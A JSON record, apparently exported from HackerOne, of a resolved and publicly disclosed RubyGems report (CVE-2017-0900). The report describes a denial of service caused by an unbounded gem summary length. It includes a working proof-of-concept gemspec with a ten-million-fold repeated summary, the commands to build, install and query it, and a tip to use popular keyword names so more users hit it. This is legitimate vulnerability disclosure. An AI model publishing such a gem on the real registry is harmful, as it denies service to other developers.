@@ -1,0 +1,132 @@
+{
+  "id": 243003,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDMwMDM=",
+  "url": "https://hackerone.com/reports/243003",
+  "title": "No limit of summary length allows Denail of Service",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-06-25T07:53:33.914Z",
+  "submitted_at": "2017-06-25T07:53:33.914Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mame",
+    "url": "/mame",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/8vhoh1hyan61xovrmfhy7kmi4gib/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8212,
+    "url": "https://hackerone.com/rubygems",
+    "handle": "rubygems",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "RubyGems",
+      "twitter_handle": "rubygems_status",
+      "website": "https://rubygems.org",
+      "about": "RubyGems.org is the Ruby community’s gem hosting service."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2017-0900"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-08-31T23:19:29.517Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2017-08-28T16:42:20.199Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Currently, there is no limit for summary length.  I think, pushing a gem whose summary is huge, will make `gem search` unavailable.\n\nThis is not Arbitrary Code Execution, but really easy to attack.  According to CVSS v3.0 Calculator, the severity is High (7.5).\n\n## How to attack\n\n1) An attacker creates a gem with huge summary string, and push it to rubygems.org.\n2) A victim runs `gem search -d <substring-of-the-name-of-the-gem>`, but it will give no response.\n\nIt may be good for the gem name to include a frequently-searched keyword, such as \"foo-rails-bar\" or \"foo-sinatra-bar\".\n\n## Proof of concept\n\n1) Prepare the following gemspec.\n\n~~~~\nGem::Specification.new do |spec|\n  spec.name     = \"huge-summary\"\n  spec.version  = \"0.0.1\"\n  spec.authors  = [\"Yusuke Endoh\"]\n  spec.email    = [\"mame@ruby-lang.org\"]\n  spec.summary  = \"foo\" * 10000000\n  spec.homepage = \"http://example.com/\"\n  spec.license  = \"MIT\"\nend\n~~~~\n\n2) Run the following commands\n\n~~~~\ngem build huge-summary.gemspec\ngem install huge-summary-0.0.1.gem\n~~~~\n\n3) Run the following command.\n\n~~~~\ngem query huge-summary -d\n~~~~\n\nIt will not answer.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-09-27T16:42:20.236Z",
+  "allow_singular_disclosure_after": -271809795.30281913,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "eveeez",
+    "silv3rpoision",
+    "sonalkr132",
+    "sonots",
+    "barbossa"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.5,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2043,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rubygems/rubygems",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
